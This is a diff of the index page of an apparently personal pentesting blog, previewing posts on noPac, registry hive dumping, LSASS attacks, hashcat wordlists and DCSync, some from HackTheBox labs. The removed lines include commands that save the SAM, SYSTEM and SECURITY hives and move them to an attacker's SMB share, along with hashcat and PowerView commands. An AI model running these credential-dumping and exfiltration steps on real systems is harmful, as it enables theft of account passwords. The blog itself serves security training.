@@ -7,7 +7,7 @@
   <meta http-equiv="expires" content="0">
   
   <title>v1pa0z Blog</title>
-  <meta name="author" content="mag">
+  <meta name="author" content="vipa0z">
   
   <meta name="description" content="my personal blog">
   
@@ -172,9 +172,6 @@
 </tr>
 </tbody></table>
 <p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.</p>
-<p>When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. </p>
-<p>When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.</p>
-<p>In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)<br><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5011266">support.microsoft.com+15</a></p>
 	
 	</div>
   <a type="button" href="/2025/07/08/No-pac/#more" class="btn btn-default more">Read More</a>
@@ -202,21 +199,33 @@
 	
 	
 		<p><img src="/../images/secd1.png" alt="alt text"></p>
-<h1 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h1><p>  <code>reg.exe</code> to save copies of the registry hives:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<p> copy to VM:</p>
-<ul>
-<li>create a smb share on attacking vm</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbserver -smb2support compdata /home/demise/mountshare</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>move hives to share:</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">move</span> <span class="title">sam.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">security.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">       </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">system.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">     </span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">sam.save  security.save  system.save</span><br></pre></td></tr></table></figure>
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.</p>
+<p>By extracting SAM, SYSTEM, and SECURITY hives from the target machine, we can transfer them to our attack host and perform offline hash cracking using tools such as Hashcat or John the Ripper, or even perform Pass-the-Hash attacks.</p>
+<h2 id="Windows-Registery-Hives"><a href="#Windows-Registery-Hives" class="headerlink" title="Windows Registery Hives"></a>Windows Registery Hives</h2><p>There are three registry hives we can copy if we have<code> local administrative</code> access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:</p>
+<table>
+<thead>
+<tr>
+<th>Registry Hive</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HKLM\SAM</code></td>
+<td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td>
+</tr>
+<tr>
+<td><code>HKLM\SYSTEM</code></td>
+<td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td>
+</tr>
+<tr>
+<td><code>HKLM\SECURITY</code></td>
+<td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
 	
 	</div>
   <a type="button" href="/2025/07/08/Dumpin Registery Hives/#more" class="btn btn-default more">Read More</a>
@@ -243,7 +252,7 @@
   <div class="row">
 	
 	
-		<h2 id><a href="#" class="headerlink" title></a><img src="/../images/mimikatz1.png" alt="alt text"></h2><h1 id="Overview-on-LSASS"><a href="#Overview-on-LSASS" class="headerlink" title="Overview on LSASS"></a>Overview on LSASS</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p>
+		<h2 id><a href="#" class="headerlink" title></a><img src="/../images/mimikatz1.png" alt="alt text"></h2><h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p>
 <p>Upon initial logon, LSASS will:</p>
 <ul>
 <li>Cache credentials locally in memory</li>
@@ -252,8 +261,6 @@
 <li>Write to Windows’ <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a><br>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</li>
 </ul>
 <h2 id="Securable-Objects"><a href="#Securable-Objects" class="headerlink" title="Securable Objects"></a>Securable Objects</h2><p>In Windows, <strong>securable objects</strong> are resources that the operating system protects through <strong>Access Control Lists (ACLs)</strong> and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.</p>
-<h2 id="LSASS-Process-Memory-dump"><a href="#LSASS-Process-Memory-dump" class="headerlink" title="LSASS Process Memory dump"></a>LSASS Process Memory dump</h2><p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K</p>
-<h3 id="Through-task-manager"><a href="#Through-task-manager" class="headerlink" title="Through task manager"></a>Through task manager</h3>
 	
 	</div>
   <a type="button" href="/2025/07/08/Attacking lsass/#more" class="btn btn-default more">Read More</a>
@@ -329,9 +336,6 @@
 <td>Toggle the case of all characters in word p@ssW0rd-&gt;P@SSw0RD</td>
 </tr>
 </tbody></table>
-<p>Each rule is written on a new line and determines how a given word should be transformed. If we write the functions shown above into a file, it may look like this:</p>
-<p>We can use the following command to apply the rules in <code>custom.rule</code> to each word in <code>password.list</code> and store the mutated results in <code>mut_password.list</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>
 	
 	</div>
   <a type="button" href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/#more" class="btn btn-default more">Read More</a>
@@ -359,12 +363,9 @@
 	
 	
 		<p><img src="/../images/REPACE.png" alt="alt text"><br><img src="/../images/dcysnc23.png" alt="alt text"></p>
-<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
 <p>The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.</p>
 <hr>
-<hr>
-<h2 id="Account-Enumeration"><a href="#Account-Enumeration" class="headerlink" title="Account Enumeration"></a>Account Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</span><br></pre></td></tr></table></figure>
-
 <h3 id="Checking-user-Groups-SID-ACLs"><a href="#Checking-user-Groups-SID-ACLs" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p>
 	
 	</div>
@@ -469,45 +470,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/wordlists/">wordlists<span>1</span></a></li>
-		
-			<li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li>
-		
-			<li><a href="/tags/nmap/">nmap<span>2</span></a></li>
-		
-			<li><a href="/tags/windows/">windows<span>3</span></a></li>
+			<li><a href="/tags/cupp/">cupp<span>1</span></a></li>
 		
 			<li><a href="/tags/HTB/">HTB<span>2</span></a></li>
-		
-			<li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li>
-		
-			<li><a href="/tags/registry/">registry<span>1</span></a></li>
 		
 			<li><a href="/tags/AD/">AD<span>2</span></a></li>
 		
 			<li><a href="/tags/password-spray/">password-spray<span>2</span></a></li>
 		
-			<li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li>
-		
-			<li><a href="/tags/htb-Cicada/">htb Cicada<span>1</span></a></li>
-		
-			<li><a href="/tags/chisel/">chisel<span>2</span></a></li>
-		
-			<li><a href="/tags/nopac/">nopac<span>1</span></a></li>
+			<li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li>
 		
 			<li><a href="/tags/Writeup/">Writeup<span>2</span></a></li>
 		
-			<li><a href="/tags/hashcat/">hashcat<span>1</span></a></li>
-		
-			<li><a href="/tags/smb/">smb<span>2</span></a></li>
-		
 			<li><a href="/tags/dcsync/">dcsync<span>1</span></a></li>
 		
-			<li><a href="/tags/cupp/">cupp<span>1</span></a></li>
+			<li><a href="/tags/openfire/">openfire<span>2</span></a></li>
+		
+			<li><a href="/tags/lsass/">lsass<span>1</span></a></li>
+		
+			<li><a href="/tags/registry/">registry<span>1</span></a></li>
+		
+			<li><a href="/tags/privEsc/">privEsc<span>1</span></a></li>
+		
+			<li><a href="/tags/htb-Cicada/">htb Cicada<span>1</span></a></li>
+		
+			<li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li>
 		
 			<li><a href="/tags/Active-Directory/">Active Directory<span>2</span></a></li>
 		
+			<li><a href="/tags/flask/">flask<span>2</span></a></li>
+		
+			<li><a href="/tags/nmap/">nmap<span>2</span></a></li>
+		
+			<li><a href="/tags/smb/">smb<span>2</span></a></li>
+		
 			<li><a href="/tags/htb-solarlab/">htb solarlab<span>1</span></a></li>
+		
+			<li><a href="/tags/secretsdump/">secretsdump<span>1</span></a></li>
+		
+			<li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>25</span></a></li>
@@ -569,7 +570,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2025 mag's Blog
+  &copy; 2025 vipa0z's Blog
   
 </p>
  </footer>
